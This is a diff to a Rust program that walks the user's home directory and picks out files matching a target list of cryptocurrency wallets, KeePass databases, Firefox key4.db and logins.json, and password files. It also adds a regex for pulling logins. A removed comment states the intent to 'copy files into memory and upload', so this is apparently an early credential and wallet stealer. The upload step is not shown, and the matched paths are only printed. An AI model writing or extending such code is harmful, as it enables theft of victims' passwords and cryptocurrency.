@@ -1,15 +1,17 @@
-
+use regex::Regex;
 use std::borrow::Borrow;
-use std::fmt::Error;
+use std::fs;
+use std::fs::{File, read, read_to_string};
+use std::io::Read;
 use std::ops::Deref;
 use std::path::{Path, PathBuf};
-
+use regex::Error;
 use dirs;
 use walkdir::WalkDir;
 use whoami;
 
 
-const MASKS: [&str; 13] = ["wallet.dat", ".wallet", ".mmd", ".kdbx", "UTC--20", "password", "passwords", "pass.txt", "key4.db", "login.bak", "key.bak", ".log", ".ldb"];
+const MASKS: [&str; 11] = ["wallet.dat", ".wallet", ".mmd", ".kdbx", "UTC--20", "pass.txt", "key4.db", "login.bak", "key.bak", ".ldb", "logins.json"];
 
 fn main() {
     //dirs::home_dir -> C:/Users/Alice
@@ -27,14 +29,15 @@ fn main() {
 
 
 fn walk_files(path: String) {
+    let RE: Result<Regex, Error> = Regex::new(r"^(?P<login>[^@\s]+)@");
     for entry in WalkDir::new(path)
         .follow_links(true)
         .into_iter()
         .filter_map(|e| e.ok()) {
         let f_name = entry.file_name().to_string_lossy();
         if is_important_file(f_name.as_ref()) {
-            println!("{}", entry.path().to_str().unwrap().clone().to_owned() + "\\" +&f_name.as_ref());
-            //copy files into memory and upload
+            println!("{}", entry.path().to_str().unwrap().clone().to_owned() );
+            //
         }
     }
 }
